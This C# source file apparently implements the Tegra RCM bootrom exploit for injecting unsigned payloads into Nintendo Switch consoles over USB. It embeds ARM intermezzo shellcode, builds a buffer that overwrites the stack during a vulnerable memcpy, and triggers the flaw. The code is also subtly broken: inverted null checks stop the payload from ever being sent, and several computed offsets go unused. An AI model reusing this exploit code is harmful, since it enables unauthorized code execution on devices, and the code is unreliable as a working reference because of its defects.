using System;
using System.IO;
using System.Runtime.InteropServices;

namespace TegramRcmX
{
    class RcmDevice
    {
        private static readonly ushort VID = 0x0955;
        private static readonly ushort PID = 0x7321;
        private static readonly byte[] Intermezzo =
        {
            0x44, 0x00, 0x9F, 0xE5, // LDR   R0, [PC, #0x44]
            0x01, 0x11, 0xA0, 0xE3, // MOV   R1, #0x40000000
            0x40, 0x20, 0x9F, 0xE5, // LDR   R2, [PC, #0x40]
            0x00, 0x20, 0x42, 0xE0, // SUB   R2, R2, R0
            0x08, 0x00, 0x00, 0xEB, // BL    #0x28
            0x01, 0x01, 0xA0, 0xE3, // MOV   R0, #0x40000000
            0x10, 0xFF, 0x2F, 0xE1, // BX    R0
            0x00, 0x00, 0xA0, 0xE1, // MOV   R0, R0
            0x2C, 0x00, 0x9F, 0xE5, // LDR   R0, [PC, #0x2C]
            0x2C, 0x10, 0x9F, 0xE5, // LDR   R1, [PC, #0x2C]
            0x02, 0x28, 0xA0, 0xE3, // MOV   R2, #0x20000
            0x01, 0x00, 0x00, 0xEB, // BL    #0xC
            0x20, 0x00, 0x9F, 0xE5, // LDR   R0, [PC, #0x20]
            0x10, 0xFF, 0x2F, 0xE1, // BX    R0
            0x04, 0x30, 0x90, 0xE4, // LDR   R3, [R0], #4
            0x04, 0x30, 0x81, 0xE4, // STR	 R3, [R1], #4
            0x04, 0x20, 0x52, 0xE2, // SUBS	 R2, R2, #4
            0xFB, 0xFF, 0xFF, 0x1A, // BNE	 #0xFFFFFFF4
            0x1E, 0xFF, 0x2F, 0xE1, // BX	 LR
            0x20, 0xF0, 0x01, 0x40, // ANDMI PC, R1, R0, LSR #32
            0x5C, 0xF0, 0x01, 0x40, // ANDMI PC, R1, IP, ASR R0
            0x00, 0x00, 0x02, 0x40, // ANDMI R0, R2, R0
            0x00, 0x00, 0x01, 0x40  // ANDMI R0, R1, R0
        };

        private static readonly uint PAYLOAD_MAX_SIZE = 0x1ED58;
        private static readonly uint PACKAGE_SIZE = 0x1000;
        private static readonly uint CND_HEADER_SIZE = 0x2a8;
        private static readonly uint PAYLOAD_TOTAL_MAX_SIZE = 0x30000;

        private static readonly uint RCM_PAYLOAD_ADDR = 0x40010000; // The address where the RCM payload is placed
        private static readonly uint INTERMEZZO_LOCATION = 0x4001F000;
        private static readonly uint PAYLOAD_LOAD_BLOCK = 0x40020000;

        // switch  DMA buffer
        private int _writes = 0;
        private Hax.HaxBackend backend;
        private static byte[] SwizzlePayload(byte[] payload)
        {
            var length = 0x30298;
            // 66216m = 0x102A8
            var buf = new byte[(int)Math.Ceiling((66216m + payload.Length) / 0x1000) * 0x1000];

            using (var mem = new MemoryStream())
            using (var wrt = new BinaryWriter(mem))
            {
                /// Prefix the image with an RCM command, so it winds up loaded into memory at the right location (RCM_PAYLOAD_ADDR).
                // Use the maximum length accepted by RCM, so we can transmit as much payload as we want.
                // We'll take over before we get to the end.
                wrt.Write(length);
                var pos = CND_HEADER_SIZE;
                mem.Position = 680;
                // Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
                for (var i = 0; i < 0x3c00; i++)
                    wrt.Write(INTERMEZZO_LOCATION);
                // We'll use this data to smash the stack when we execute the vulnerable memcpy.
                var rcm_addr = INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDR + 0x2a8;
                mem.Position = 0xf2a8;
                // Include the builtin intermezzo in the command stream. This is our first-stage
                // payload, and it's responsible for relocating the final payload to RCM_PAYLOAD_ADDR
                wrt.Write(Intermezzo);
                var padding = PAYLOAD_LOAD_BLOCK - INTERMEZZO_LOCATION + (uint)Intermezzo.Length;
                mem.Position = 0x102a8;
                // Finally, pad until we've reached the position we need to put the payload.
                // This ensures the payload winds up at the location Intermezzo expects.
                wrt.Write(payload);
                Array.Copy(mem.ToArray(), buf, mem.Length);
                return buf;
            }
        }

        public RcmDevice()
        {
            if (MyOperatingSystem.isWindows())
            {
                backend = new Hax.WindowsHax();
            }
            else if (MyOperatingSystem.isMacOS())
            {
                backend = new Hax.MacOSHax();
            }
            else
            {
                throw new Exception("It doesn't look like we support your OS, currently. Sorry about that!");
            }

        }

        public string InitDevice(bool waitForDevice = false)
        {
            if (!backend.FindDevice(VID, PID))
            {
                if(waitForDevice)
                {
                    while (true)
                    {
                        if(backend.FindDevice(VID, PID))
                        {
                            break;
                        }
                    }
                }
                return "No TegraRCM device found?";
            }

            if (!backend.OpenDevice())
            {
                return "Cannot access device, is your Switch plugged in, turned on and in RCM mode?";
            }

            return "success";
        }

        public string GetDeviceID()
        {
            var devid = new byte[0x10];
            if (backend != null)
                backend.Read(devid);

            return BitConverter.ToString(devid).Replace("-", "").ToLower();
        }

        public void SendPayload(string path)
        {
            SendPayload(File.ReadAllBytes(path));
        }

        public void SendPayload(byte[] rawpayload)
        {
            if (backend != null) return;

            var payload = SwizzlePayload(rawpayload);
            var buffer = new byte[PACKAGE_SIZE];
            for (var i = 0; i < payload.Length - 1; i += (int)PACKAGE_SIZE, _writes++)
            {
                Buffer.BlockCopy(payload, i, buffer, 0, (int)PACKAGE_SIZE);
                backend.WriteSingleBuffer(buffer);
            }
        }

        private void SwitchToHighBuffer()
        {
            if (backend != null) return;
            // u32 getCurrentBufferAddress() const { return m_currentBuffer == 0 ? 0x40005000u : 0x40009000u; }
            // if m_currentBuffer == 0
            // write('0' * 0x1000)
            if (_writes % 2 != 1)
            {
                backend.WriteSingleBuffer(new byte[0x1000]);
            }
        }

        public bool TriggerControlledMemcpy()
        {
            SwitchToHighBuffer();

            var length = RCM_PAYLOAD_ADDR - 0x40009000;

            // Console.WriteLine($"length: {length}, equal 28672?");
            // Smashing the stack!
            return backend.TriggerVulnerability();
        }
    }

    public static class MyOperatingSystem
    {
        public static bool isWindows() => RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
        public static bool isMacOS() => RuntimeInformation.IsOSPlatform(OSPlatform.OSX);
        public static bool isLinux() => RuntimeInformation.IsOSPlatform(OSPlatform.Linux);
    }
}
